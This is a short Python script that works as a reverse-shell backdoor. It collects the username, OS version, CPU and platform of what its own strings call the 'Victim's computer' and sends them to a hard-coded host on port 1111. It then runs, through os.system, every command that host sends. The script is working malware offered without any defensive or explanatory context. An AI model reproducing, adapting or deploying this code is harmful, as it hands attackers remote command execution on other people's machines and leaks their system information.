from socket import *
import os
import platform
import getpass
username = "\nVictim's computer username : "+getpass.getuser()
infor="\nVictim's computer OS version : "+platform.platform()
cpuinfo="\nVictim's computer CPU : "+platform.processor()
sysinfo="\nVictim's computer platform : "+platform.system()
ip="192.168.219.106"
port=1111
clientSock = socket(AF_INET, SOCK_STREAM)
clientSock.connect((ip,port))
clientSock.send(infor.encode('utf-8'))
clientSock.send(sysinfo.encode('utf-8'))
clientSock.send(cpuinfo.encode('utf-8'))
clientSock.send(username.encode('utf-8'))
while True:
    recvData = clientSock.recv(1024)
    recvData=recvData.decode('utf-8')
    os.system(recvData)
    sendData = "OK"
    clientSock.send(sendData.encode('utf-8'))
